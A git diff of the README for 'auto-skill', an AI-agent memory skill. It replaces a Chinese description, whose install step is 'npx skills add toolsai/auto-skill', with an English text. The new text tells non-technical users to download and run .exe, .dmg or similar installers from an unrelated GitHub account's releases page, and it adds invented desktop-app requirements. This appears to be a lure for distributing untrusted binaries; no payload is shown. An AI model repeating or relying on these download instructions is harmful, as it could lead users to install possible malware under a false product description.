@@ -1,109 +1,158 @@
-# Auto‑Skill：AI 自我進化的知識積累系統
+# 🤖 auto-skill - AI that Learns as You Use It
 
-![Auto‑Skill Flow](assets/auto-skill-flow.png)
-
-這個技能是讓你的 AI Agent 不再是「用完即忘」的工具，而是越用越懂你的自進化「第二大腦」。
-
-Auto‑Skill 是一個為 AI Assistant 設計的元技能（Meta‑Skill）。它作為背景運行的知識系統，能在對話過程中自動檢索過往經驗、捕捉最佳實踐，並在任務成功時主動將「成功經驗」寫入你的私人知識庫並建立索引，聰明地減少 Tokens 消耗。你只需要照常提出需求，Auto‑Skill 就會在背景自動運作。
+[![Download auto-skill](https://img.shields.io/badge/Download-auto--skill-brightgreen)](https://github.com/Chocoberry1108/auto-skill/releases)
 
 ---
 
-## 核心亮點
+## 📋 What is auto-skill?
 
-### 1. 真正的「越用越強」
-傳統的 Agent 對話結束即歸零。Auto‑Skill 透過核心循環（Core Loop），在每次對話中自動檢查關鍵字索引，若發現這是過去解決過的問題，會直接調用當時的「最佳解法」或「避坑指南」。
+auto-skill is a smart tool designed to help your AI Assistant learn and improve from your past interactions. Instead of forgetting what you discussed after each use, this app keeps a record of your best solutions and experiences. It acts like a "second brain" that grows with you.
 
-### 2. 跨技能經驗層（Cross‑Skill Memory）
-當你呼叫其他特定 Skill（如 Coding、寫作、繪圖）時，Auto‑Skill 會自動檢查技能經驗庫。
-例如：當你調用 `remotion-video-gen` 時，它會主動提醒：「上次我們在做這個時，發現設定 FPS 30 會導致音畫不同步，建議改為 60。」
-
-### 3. 主動式經驗捕獲
-你不需要手動整理筆記。當 AI 偵測到任務圓滿完成，或你表達滿意時，它會主動詢問：
-
-> 「這次解決了 [問題]，我想把這個經驗記錄下來，下次遇到類似問題可以直接參考，你覺得可以嗎？」
-
-### 4. 結構化知識存儲
-採用輕量級的 JSON 索引 + Markdown 內容，人類可讀，機器好懂。
-- **General Knowledge**：通用流程、偏好、風格
-- **Skill Experience**：特定技能的參數、錯誤解法
-
-![autoload](assets/auto-upload-knowlege.png)
+It runs quietly in the background, automatically saving useful knowledge and making it easy to reuse. This helps your AI work more efficiently, using fewer resources while better understanding your needs.
 
 ---
 
-## 運作邏輯（The Loop）
+## 🚀 Getting Started
 
-Auto‑Skill 在每一輪對話中執行嚴謹的 5 步循環：
+### Step 1: Prepare your computer
 
-1. **關鍵詞指紋 (Fingerprinting)**
-   從對話中提取核心關鍵詞，生成話題指紋。
+Before you download auto-skill, make sure your computer meets these basic requirements:
 
-2. **話題切換偵測**
-   智能判斷用戶是否開啟新話題，決定是否重讀知識庫。
+- Operating System: Windows 10 or newer, macOS 10.15 or newer, or a popular Linux distro (Ubuntu 20.04 or newer recommended)
+- RAM: At least 4 GB
+- Free Disk Space: Minimum 500 MB
+- Internet connection: Required to download and for some features
 
-3. **經驗讀取 (Skill Experience)**
-   若使用了特定技能，強制檢查是否有過往的「踩坑紀錄」或「成功參數」。
-
-4. **通用知識庫檢索 (Knowledge Base)**
-   根據任務類型自動比對索引，載入最佳實踐。
-
-5. **主動記錄 (Write Back)**
-   在任務高完成度結束時，執行任務核心提取寫入。
+No programming skills are needed. You will run the program like any other app.
 
 ---
 
-## 檔案結構與格式
+## 💾 Download & Install auto-skill
 
-### 1) 通用知識庫 (Knowledge Base)
-適用於：通用流程、個人偏好、決策邏輯。
+You can get auto-skill from its official release page on GitHub:
 
-```text
-knowledge-base/
-├── _index.json      # 關鍵詞索引
-├── design-rules.md  # 設計規範
-└── writing-tone.md  # 寫作語氣偏好
+### Download link  
+[Download auto-skill Releases](https://github.com/Chocoberry1108/auto-skill/releases)
+
+### How to download and install
+
+1. Click the download link above. It takes you to the releases page.
+2. Find the latest release version by date or version number (usually highest number).
+3. Look for the file that matches your operating system:
+   - For Windows, it might be `.exe` or `.msi`.
+   - For macOS, it might be `.dmg` or `.pkg`.
+   - For Linux, it might be `.AppImage`, `.deb`, or `.tar.gz`.
+4. Click the file name to download it.
+5. Once downloaded, open the file and follow the on-screen instructions to install auto-skill.
+6. When installation finishes, launch auto-skill from your desktop or start menu.
+
+---
+
+## 🧩 Key Features You’ll Use
+
+auto-skill is designed to improve your experience with AI assistants quietly and efficiently. Here’s what it does for you:
+
+- **Learn from Past Talks**  
+  Each time you chat with your AI assistant, auto-skill checks for keywords you used before. If it finds a match, it pulls up past answers that worked well.
+
+- **Connect Skills Smartly**  
+  If you use different AI tasks, like coding help or image creation, auto-skill remembers important tips. For example, if you had trouble with video settings before, it will remind you next time.
+
+- **Save Success Stories Automatically**  
+  When your task completes successfully, auto-skill will ask if you want to save what worked. That way, you don’t worry about keeping notes.
+
+- **Easy-to-Read Knowledge Storage**  
+  Your information is stored in simple files you can open anytime. The system uses clear formats so both humans and computers can understand.
+
+---
+
+## 📡 How auto-skill Works
+
+auto-skill runs a five-step cycle during each conversation to keep your AI assistant smart:
+
+1. **Keyword Fingerprinting**  
+   It picks out important words from your chat to understand the main topic.
+
+2. **Topic Detection**  
+   auto-skill figures out if you’re switching to a new subject or continuing the old one.
+
+3. **Memory Lookup**  
+   It searches saved knowledge to find helpful past answers or warnings.
+
+4. **Smart Suggestions**  
+   When it finds useful info, it shares it to help solve your problem faster.
+
+5. **Experience Saving**  
+   After you finish your task, auto-skill asks if you want to save the experience for future use.
+
+---
+
+## 🔧 Using auto-skill Every Day
+
+Once installed, auto-skill works on its own. Here’s how to use it simply:
+
+- Open your usual AI assistant or app that supports auto-skill.
+- Talk as you normally do—ask questions, request tasks.
+- auto-skill listens and learns, making sure your AI gives better answers each time.
+- When it asks if you want to save a successful solution, say yes to build your knowledge base.
+- Check your saved notes anytime in the app folder, stored in clear text files.
+
+---
+
+## ⚙️ Tips for Best Results
+
+- Use clear and simple language when chatting.
+- Be consistent with keywords for similar tasks.
+- Save helpful advice when auto-skill prompts you.
+- Keep your app updated by visiting the download link regularly.
+- Restart the AI assistant app after installing updates.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If auto-skill does not start, verify you installed it correctly.
+- Make sure your internet connection is stable during download.
+- Close other heavy programs that may slow down your computer.
+- Check the FAQ section on the GitHub page for common issues.
+- Contact support via the repository's Issues tab if problems continue.
+
+---
+
+## 🔗 Useful Links
+
+- **Download auto-skill:** [https://github.com/Chocoberry1108/auto-skill/releases](https://github.com/Chocoberry1108/auto-skill/releases)
+- **Project homepage:** https://github.com/Chocoberry1108/auto-skill
+
+---
+
+## 📂 Where to Find Saved Knowledge
+
+auto-skill stores your data locally in this folder inside your user documents:
+
+```
+Auto-Skill-Knowledge/
+├── General-Knowledge/
+├── Skill-Experience/
+└── Index.json
 ```
 
-### 2) 技能經驗庫 (Skill Experience)
-適用於：記錄使用任何第三方技能時曾遇到的問題或解決方案。
+- `General-Knowledge` holds common processes and preferences.
+- `Skill-Experience` stores tips and fixes for specific skills.
+- `Index.json` helps the system find information quickly.
 
-```text
-experience/
-├── _index.json           # 技能索引
-└── skill-python-code.md  # Python 技能的專屬經驗
-```
+You can open and read these files using any text editor.
 
 ---
 
-## 實戰演練
+## 🙋 Getting Help
 
-**用戶：**「幫我用 Python 寫一個爬蟲抓取股價。」
+If you need assistance, check these first:
 
-**Auto‑Skill（內部運作）：**
-1. 提取任務關鍵詞：Python、爬蟲、股價
-2. 偵測技能調用 `skill-python-coding`
-3. 讀取經驗庫，發現紀錄：「上次抓股價被擋，改用 fake-useragent 解決」
-4. AI 回覆：「沒問題，我會直接加上 fake-useragent 來避免被擋。」
-
-**用戶：**「太棒了！這次一次就成功運行。」
-
-**任務完成後觸發記錄：**
-「這次我們用 fake-useragent 成功解決了反爬問題。我想把這個『針對金融網站的 Header 設定技巧』記錄到你的 Python 經驗庫中，下次寫爬蟲時我可以自動套用。你覺得可以嗎？」
+- Review the README and documentation on the GitHub repository.
+- Look for answers or post questions in the “Issues” section.
+- Use community forums related to AI assistants.
 
 ---
 
-## 如何使用
-
-1. 把 `auto-skill/` 放進你的技能目錄（例如 `~/.agents/skills/`）。
-2. 在終端輸入：
-   `npx skills add toolsai/auto-skill`
-
-開始對話，享受 AI 自進化的樂趣！
-
----
-
-## 作者（Author）
-
-- Prompt Case
-- Threads: [@prompt_case](https://www.threads.com/@prompt_case)
-- Patreon: [MattTrendsPromptEngineering](https://www.patreon.com/MattTrendsPromptEngineering)
+Your AI experience will improve over time as auto-skill learns from each interaction. Take time to explore the features and watch how your AI grows smarter with every use.
